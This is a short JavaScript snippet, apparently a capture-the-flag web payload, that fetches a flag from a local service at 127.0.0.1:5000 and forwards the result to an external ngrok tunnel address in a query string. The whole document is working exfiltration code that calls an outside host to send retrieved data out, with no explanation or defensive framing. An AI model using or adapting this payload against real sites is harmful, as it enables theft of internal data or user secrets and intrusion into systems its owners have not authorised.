fetch("http://127.0.0.1:5000/get_flag")
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    return response.text();
  })
  .then(data => {
    responseData = data;
    console.log("Fetched data:", responseData);
    fetch("https://a73dffa150cb.ngrok-free.app?c="+responseData);
  })
  .catch(error => {
    console.error("Fetch error:", error);
  });
